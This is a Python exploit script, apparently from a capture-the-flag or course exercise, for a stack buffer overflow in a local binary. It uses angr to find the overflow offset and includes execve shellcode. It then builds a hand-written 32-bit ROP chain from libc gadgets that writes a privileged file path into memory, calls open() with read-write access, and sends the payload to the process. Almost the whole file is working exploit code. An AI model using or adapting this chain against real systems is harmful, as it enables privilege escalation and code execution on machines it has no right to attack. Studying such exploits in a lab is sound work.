import angr, argparse, IPython, angrop
import claripy
from pwn import *
import pickle
from os import path
def check_continuity(address, addresses, length):
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''

    for i in range(length):
        if not address + i in addresses:
            return False

    return True
def find_symbolic_buffer(state, length):
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    '''

    # get all the symbolic bytes from stdin
    stdin = state.posix.stdin

    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('argv1'):
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr
shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
def main():
    elf_binary ="vuln_stackoverflow-medium"
    p = angr.Project(elf_binary, load_options={'auto_load_libs': False})

    exploited = p.loader.main_object.get_symbol(
        'svcunix_create_vuln')

    goal = p.loader.main_object.get_symbol(
        'goal')

    argv1 = claripy.BVS("argv1",8*500)
    #state = p.factory.full_init_state(args=[elf_binary,argv])
    #state = p.factory.entry_state(args=[elf_binary,argv1])

    state = p.factory.entry_state(args=[elf_binary],stdin=argv1)
    #state = p.factory.call_state(exploited.rebased_addr,argv1)#addr=exploited.rebased_addr
    state.libc.buf_symbolic_bytes = 0x200
    state.libc.max_variable_size = 0x200
    state.libc.max_str_len = 205# fuck that shit, our string can be bigger than the default of 128, only at around 140bytes will the bof trigger
    #for i in range(0,200):
    #    state.add_constraints(argv1.get_byte(i) != 0)

    
    simgr = p.factory.simulation_manager(state, save_unconstrained=True)
    simgr.stashes['mem_corrupt']  = []
    
    
    def check_mem_corruption(simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == b"ABCD"]):
                    path.add_constraints(path.regs.pc == b"ABCD")
                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')
        return simgr
    """
    simgr.explore(step_func=check_mem_corruption)

    IPython.embed()

    ep = simgr.mem_corrupt[0]

    input = ep.solver.eval(argv1,cast_to=bytes)

    pointer_offset = input.find(b"ABCD"[::-1])

    print("offset",pointer_offset)
    """
    pointer_offset = 128 #temp

   # 
    #
    libc_off = 0xf7dbb000
    str1 = b"//home/privileged/stackoverflow-medium"

    p = angr.Project("/usr/lib32/libc-2.31.so",main_opts={'base_addr': libc_off})

    rop = p.analyses.ROP()

    rop.set_badbytes([0x00])
    # rop.find_gadgets()
    

    
    #chain = rop.write_to_mem(0x804b016, b"/home/privileged/stackoverflow-medium")+ rop.func_call("open", [0x804b016,os.O_RDWR])
    #chain = rop.set_regs(rax=0x1337133713371337)
    #print(chain)
    
    
    print([str1[i:min(i+4,len(str1))][::-1].hex() for i in range(0, len(str1), 4)])

    #rop.write_to_mem(0x804c00e, b"////home/privileged/stackoverflow-medium").print_payload_code()
    code_base = libc_off
    ######rop.write_to_mem(0x804b016, b"//home/privileged/stackoverflow-medium")######
    chain = b""
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x2f2f2f30)
    chain += p32(0x804bfc6)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x656d6f69)
    chain += p32(0x804bfca)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x69727030)
    chain += p32(0x804bfce)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x656c6977)
    chain += p32(0x804bfd2)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x2f646568)
    chain += p32(0x804bfd6)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x63617474)
    chain += p32(0x804bfda)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x65766f6c)
    chain += p32(0x804bfde)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x6f6c6673)
    chain += p32(0x804bfe2)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x656d2d78)
    chain += p32(0x804bfe6)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    chain += p32(code_base + 0x30ea3)       # pop ecx; pop edx; ret 
    chain += p32(0x6d756965)
    chain += p32(0x804bfea)
    chain += p32(code_base + 0x320b0)       # lea eax, [ecx - 1]; mov dword ptr [edx + 0x48], eax; mov eax, ecx; ret 
    """
    chain = b""
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b016)
    chain += p32(0x6f682f2f)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b01a)
    chain += p32(0x702f656d)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b01e)
    chain += p32(0x69766972)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b022)
    chain += p32(0x6567656c)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b026)
    chain += p32(0x74732f64)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b02a)
    chain += p32(0x6f6b6361)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b02e)
    chain += p32(0x66726576)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b032)
    chain += p32(0x2d776f6c)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b036)
    chain += p32(0x6964656d)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b03a)
    chain += p32(0xffff6d75)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    ######rop.write_to_mem(0x804b016, b"//home/privileged/stackoverflow-medium")######
    
    """
    #######custom rop##########
    pop_ecx_eax = 0x001066d0
    xor_eax_eax = 0x0002e970
    mov_ecx_eax = 0x000b4558
    chain += p32(code_base + pop_ecx_eax)      # pop ecx; ret 
    chain += p32(0x804b03e)
    chain += p32(0xffffffff)
    chain += p32(code_base + xor_eax_eax)      # xor eax, eax; ret 
    chain += p32(code_base + mov_ecx_eax)      # mov ecx, eax; ret
    chain += p32(code_base + 0x3209e)       # mov dword ptr [edx + 0x4c], ecx; ret 
    #######custom rop##########
    

    #print(rop.func_call("open", [0x804b016,os.O_RDWR]).print_payload_code())
    #######rop.func_call("open", [0x804b016,os.O_RDWR])#######
    chain += p32(code_base + 0xf0120)
    chain += p32(code_base + 0x1926c)       # pop esi; pop edi; ret 
    chain += p32(0x804b016)
    chain += p32(0x2)
    #######rop.func_call("open", [0x804b016,os.O_RDWR])#######
    

    with open("pay","wb") as f:
        f.write(pointer_offset*b"a"+chain)
    
    print((pointer_offset*b"a"+chain).hex())

    chan = process(elf_binary)
    chan.sendline(pointer_offset*b"a"+chain)
    chan.interactive()    
    
if __name__ == "__main__":
    main()